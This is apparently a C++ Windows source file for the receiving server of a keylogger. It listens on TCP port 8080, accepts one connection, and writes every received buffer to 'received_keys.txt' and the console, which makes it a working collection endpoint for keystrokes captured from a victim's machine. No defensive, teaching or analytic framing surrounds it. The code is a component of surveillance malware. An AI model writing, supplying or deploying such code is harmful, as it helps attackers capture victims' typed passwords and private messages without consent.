#include <iostream>
#include <winsock2.h>
#include <fstream>

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define PORT 8080

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET serverSock = socket(AF_INET, SOCK_STREAM, 0);

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);

    bind(serverSock, (struct sockaddr*)&server, sizeof(server));
    listen(serverSock, 3);
    cout << "Server listening on port " << PORT << endl;

    SOCKET clientSock = accept(serverSock, NULL, NULL);
    char buffer[256];
    ofstream logFile("received_keys.txt", ios::app);

    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytesReceived = recv(clientSock, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            logFile << buffer;
            logFile.flush();  // Ensure data is written immediately
            cout << buffer;   // Optional: Display received keys on console
        }
    }

    logFile.close();
    closesocket(serverSock);
    WSACleanup();
    return 0;
}